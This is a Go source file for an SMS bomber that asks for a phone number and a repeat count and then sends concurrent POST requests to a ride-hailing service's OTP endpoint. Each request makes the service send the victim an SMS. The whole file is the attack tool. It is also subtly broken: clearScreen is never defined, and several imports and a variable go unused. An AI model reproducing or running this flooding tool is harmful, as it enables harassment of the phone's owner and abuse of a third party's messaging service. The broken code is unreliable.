package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func sms(url string, payload map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error marshaling JSON!", err)
		ch <- http.StatusInternalServerError
		return
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error sending request to", url, "!", err)
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()
	ch <- resp.StatusCode
}

func main() {
	clearScreen()
	var phone string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)
	formattedPhone := "98-" + phone

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ch := make(chan int)

	for i := 0; i < repeatCount; i++ {
		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
			"cellphone": phone,
		}, ch)
	}

	for i := 0; i < repeatCount; i++ {
		statusCode := <-ch
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
